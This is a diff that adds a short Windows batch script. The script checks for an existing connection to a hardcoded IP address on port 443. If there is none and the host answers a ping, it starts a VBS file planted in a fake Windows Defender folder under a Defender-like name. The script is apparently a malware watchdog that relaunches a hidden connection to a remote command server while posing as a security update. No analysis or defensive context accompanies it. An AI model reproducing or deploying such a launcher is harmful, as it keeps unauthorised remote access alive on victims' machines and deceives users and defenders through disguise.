@@ -1,0 +1,11 @@
+@echo off
+netstat.exe -n | findstr 170.130.55.85:443
+if "%errorlevel%" EQU "1" (goto NEXT) else (exit)
+
+:NEXT
+ping 170.130.55.85 -n 1 | findstr "TTL=" >nul
+if "%errorlevel%" EQU "1" (exit) else (goto RUN)
+
+:RUN
+start C:\Windows\SystemApps\Microsoft.Windows.Defender_cw5n1h2txyewy\DefenderUpdateRun.vbs
+exit
